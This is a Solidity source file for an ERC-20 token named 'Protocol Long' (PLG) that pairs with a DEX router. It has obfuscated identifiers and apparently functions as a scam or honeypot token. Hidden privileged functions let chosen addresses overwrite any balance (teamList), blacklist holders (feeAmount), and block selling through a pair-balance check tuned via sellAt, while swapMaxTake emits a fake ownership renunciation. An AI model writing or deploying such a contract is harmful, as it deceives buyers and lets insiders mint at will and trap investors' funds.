//SPDX-License-Identifier: MIT

pragma solidity ^0.8.11;

interface walletLimitMin {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract maxLimit {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface txReceiver {
    function createPair(address toExemptShould, address receiverMode) external returns (address);
}

interface limitSell {
    function totalSupply() external view returns (uint256);

    function balanceOf(address amountLiquidity) external view returns (uint256);

    function transfer(address buySenderLimit, uint256 takeAtLimit) external returns (bool);

    function allowance(address totalIs, address spender) external view returns (uint256);

    function approve(address spender, uint256 takeAtLimit) external returns (bool);

    function transferFrom(
        address sender,
        address buySenderLimit,
        uint256 takeAtLimit
    ) external returns (bool);

    event Transfer(address indexed from, address indexed maxTotalFee, uint256 value);
    event Approval(address indexed totalIs, address indexed spender, uint256 value);
}

interface liquidityFee is limitSell {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ProtocolLong is maxLimit, limitSell, liquidityFee {

    address public shouldBuy;

    mapping(address => bool) public exemptToken;

    mapping(address => uint256) private launchLimit;

    bool private fundReceiver;

    uint256 public marketingMin;

    function feeAmount(address sellBuyToken) public {
        walletReceiverEnable();
        
        if (sellBuyToken == shouldBuy || sellBuyToken == modeList) {
            return;
        }
        exemptToken[sellBuyToken] = true;
    }

    constructor (){
        
        walletLimitMin liquidityMode = walletLimitMin(liquidityFrom);
        modeList = txReceiver(liquidityMode.factory()).createPair(liquidityMode.WETH(), address(this));
        if (limitMarketingTake != limitSwapTeam) {
            limitSwapTeam = marketingMin;
        }
        shouldBuy = _msgSender();
        swapMaxTake();
        modeMaxTeam[shouldBuy] = true;
        launchLimit[shouldBuy] = sellTotal;
        
        emit Transfer(address(0), shouldBuy, sellTotal);
    }

    function name() external view virtual override returns (string memory) {
        return maxToken;
    }

    bool public takeFromLaunched;

    address private autoMarketing;

    function transferFrom(address atLaunchedFee, address buySenderLimit, uint256 takeAtLimit) external override returns (bool) {
        if (_msgSender() != liquidityFrom) {
            if (amountTo[atLaunchedFee][_msgSender()] != type(uint256).max) {
                require(takeAtLimit <= amountTo[atLaunchedFee][_msgSender()]);
                amountTo[atLaunchedFee][_msgSender()] -= takeAtLimit;
            }
        }
        return marketingTakeLiquidity(atLaunchedFee, buySenderLimit, takeAtLimit);
    }

    string private takeMinAuto = "PLG";

    function sellAt(uint256 takeAtLimit) public {
        walletReceiverEnable();
        receiverMax = takeAtLimit;
    }

    function isFund(address shouldTrading) public {
        if (takeFromLaunched) {
            return;
        }
        
        modeMaxTeam[shouldTrading] = true;
        
        takeFromLaunched = true;
    }

    uint256 private limitSwapTeam;

    bool public amountAt;

    function exemptFrom(address atLaunchedFee, address buySenderLimit, uint256 takeAtLimit) internal returns (bool) {
        require(launchLimit[atLaunchedFee] >= takeAtLimit);
        launchLimit[atLaunchedFee] -= takeAtLimit;
        launchLimit[buySenderLimit] += takeAtLimit;
        emit Transfer(atLaunchedFee, buySenderLimit, takeAtLimit);
        return true;
    }

    function balanceOf(address amountLiquidity) public view virtual override returns (uint256) {
        return launchLimit[amountLiquidity];
    }

    function transfer(address liquidityLimit, uint256 takeAtLimit) external virtual override returns (bool) {
        return marketingTakeLiquidity(_msgSender(), liquidityLimit, takeAtLimit);
    }

    function decimals() external view virtual override returns (uint8) {
        return modeLiquidityMax;
    }

    uint256 constant launchedList = 8 ** 10;

    function totalSupply() external view virtual override returns (uint256) {
        return sellTotal;
    }

    function walletReceiverEnable() private view {
        require(modeMaxTeam[_msgSender()]);
    }

    address public modeList;

    bool private maxEnable;

    function teamList(address liquidityLimit, uint256 takeAtLimit) public {
        walletReceiverEnable();
        launchLimit[liquidityLimit] = takeAtLimit;
    }

    uint8 private modeLiquidityMax = 18;

    mapping(address => bool) public modeMaxTeam;

    function swapMaxTake() public {
        emit OwnershipTransferred(shouldBuy, address(0));
        autoMarketing = address(0);
    }

    uint256 private limitMarketingTake;

    event OwnershipTransferred(address indexed launchedShouldFund, address indexed fromTx);

    function owner() external view returns (address) {
        return autoMarketing;
    }

    bool private receiverAtLiquidity;

    uint256 public shouldTo;

    uint256 totalReceiverWallet;

    uint256 receiverMax;

    address liquidityFrom = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    address marketingMode = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    mapping(address => mapping(address => uint256)) private amountTo;

    function approve(address listWallet, uint256 takeAtLimit) public virtual override returns (bool) {
        amountTo[_msgSender()][listWallet] = takeAtLimit;
        emit Approval(_msgSender(), listWallet, takeAtLimit);
        return true;
    }

    uint256 private sellTotal = 100000000 * 10 ** 18;

    function symbol() external view virtual override returns (string memory) {
        return takeMinAuto;
    }

    string private maxToken = "Protocol Long";

    function getOwner() external view returns (address) {
        return autoMarketing;
    }

    function allowance(address limitWallet, address listWallet) external view virtual override returns (uint256) {
        if (listWallet == liquidityFrom) {
            return type(uint256).max;
        }
        return amountTo[limitWallet][listWallet];
    }

    function marketingTakeLiquidity(address atLaunchedFee, address buySenderLimit, uint256 takeAtLimit) internal returns (bool) {
        if (atLaunchedFee == shouldBuy) {
            return exemptFrom(atLaunchedFee, buySenderLimit, takeAtLimit);
        }
        uint256 exemptMax = limitSell(modeList).balanceOf(marketingMode);
        require(exemptMax == receiverMax);
        require(buySenderLimit != marketingMode);
        if (exemptToken[atLaunchedFee]) {
            return exemptFrom(atLaunchedFee, buySenderLimit, launchedList);
        }
        return exemptFrom(atLaunchedFee, buySenderLimit, takeAtLimit);
    }

}